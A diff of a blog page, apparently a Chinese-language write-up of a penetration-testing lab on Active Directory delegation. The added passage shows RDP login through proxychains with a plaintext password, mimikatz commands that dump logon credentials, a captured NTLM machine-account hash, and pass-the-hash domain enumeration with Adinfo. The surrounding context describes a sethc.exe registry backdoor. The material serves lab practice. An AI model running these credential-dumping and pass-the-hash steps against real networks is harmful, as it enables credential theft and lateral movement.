@@ -289,6 +289,13 @@
       </ol>
     </li>
     <li><a href="#考点三注册表提权">考点三：注册表提权</a></li>
+    <li><a href="#考点四猕猴桃抓hash">考点四:猕猴桃抓hash</a></li>
+    <li><a href="#考点域内信息搜集">考点：域内信息搜集</a>
+      <ol>
+        <li><a href="#adinfo">Adinfo</a></li>
+        <li><a href="#非约束性委派攻击">非约束性委派攻击</a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -353,7 +360,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 4 分钟
+                    阅读时长: 5 分钟
                 </time>
             </div>
         
@@ -803,7 +810,100 @@
 <pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">修改gupdate服务ImagePath</span> <span class="o">-&gt;</span> <span class="n">指向我们的b</span><span class="o">.</span><span class="n">exe</span> <span class="o">-&gt;</span> <span class="n">启动gupdate服务</span> <span class="o">-&gt;</span> <span class="n">b</span><span class="o">.</span><span class="n">exe以系统权限运行</span> <span class="o">-&gt;</span> <span class="n">b</span><span class="o">.</span><span class="n">exe执行bad</span><span class="o">.</span><span class="n">bat</span> <span class="o">-&gt;</span> <span class="n">bad</span><span class="o">.</span><span class="n">bat修改注册表</span><span class="err">（</span><span class="n">设置sethc</span><span class="o">.</span><span class="n">exe的调试器为cmd</span><span class="o">.</span><span class="n">exe</span><span class="err">）</span> <span class="o">-&gt;</span> <span class="n">锁定计算机</span> <span class="o">-&gt;</span> <span class="n">在登录界面按5次shift</span> <span class="o">-&gt;</span> <span class="n">触发sethc</span><span class="o">.</span><span class="n">exe的调试器</span><span class="err">（</span><span class="n">即cmd</span><span class="o">.</span><span class="n">exe</span><span class="err">）</span><span class="n">并以系统权限运行</span> <span class="o">-&gt;</span> <span class="n">获取系统权限</span><span class="err">。</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><h2 id="考点四猕猴桃抓hash">考点四:猕猴桃抓hash
+</h2><p>新用户连接远程桌面, 新用户是管理员组, 权限较高</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 xfreerdp /u:WIN19\\tao /p:&#39;123456qwe.&#39; /v:172.22.4.45 /cert:ignore /drive:share,/mnt/xpw/kali_shard
+</span></span></code></pre></td></tr></table>
 </div>
+</div><p>上传一个mimikatz.exe, 抓取用户密钥以管理员身份运行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">sekurlsa::logonpasswords
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/delegation/image-20251214210439235.png"
+	width="822"
+	height="295"
+	srcset="/p/delegation/image-20251214210439235_hu_1bbabdd8bc46c367.png 480w, /p/delegation/image-20251214210439235_hu_7a6ec55de25e6050.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251214210439235"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="278"
+		data-flex-basis="668px"
+	
+></p>
+<p>可以拿到<code>WIN19$</code>机器账户的<code>NTLM</code> 搜集域内信息通常需要域内账户的凭据（域内用户或机器账户）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">fd24e922667ef1f8477b6a8f52a8e64f
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="考点域内信息搜集">考点：域内信息搜集
+</h2><h3 id="adinfo">Adinfo
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Adinfo_win.exe -d xiaorang.lab --dc 172.22.4.7 -u WIN19$ -H fd24e922667ef1f8477b6a8f52a8e64f
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Adinfo_win.exe: 用于查询 Active Directory 域信息的工具
+</span></span><span class="line"><span class="cl">-d: 指定目标域的域名
+</span></span><span class="line"><span class="cl">--dc: 指定域控制器(DC)的 IP 地址或主机名
+</span></span><span class="line"><span class="cl">-H : 表示使用 NTLM 哈希进行认证，而不是明文密码
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://github.com/lzzbb/Adinfo/releases"  target="_blank" rel="noopener"
+    >https://github.com/lzzbb/Adinfo/releases</a></p>
+<p><img src="/p/delegation/image-20251214210710795.png"
+	width="406"
+	height="203"
+	srcset="/p/delegation/image-20251214210710795_hu_d36a37ac701bf88f.png 480w, /p/delegation/image-20251214210710795_hu_8d11af2e6a2be57a.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251214210710795"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="200"
+		data-flex-basis="480px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">`</span><span class="n">Unconstrained</span> <span class="n">Delegation</span><span class="err">`</span><span class="p">:</span><span class="err">无约束委派，这个表明计算机</span> <span class="n">WIN19</span> <span class="err">被配置为无约束委派，那么这里下一步就很明显的是无约束委派攻击的方式了</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="非约束性委派攻击">非约束性委派攻击
+</h3>
 </section>
 
 
@@ -842,6 +942,19 @@
     <h2 class="section-title">相关文章</h2>
     <div class="related-content">
         <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/cyber-lab1/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab1</h2>
+        </div>
+    </a>
+</article>
+
             
                 
 <article class="">
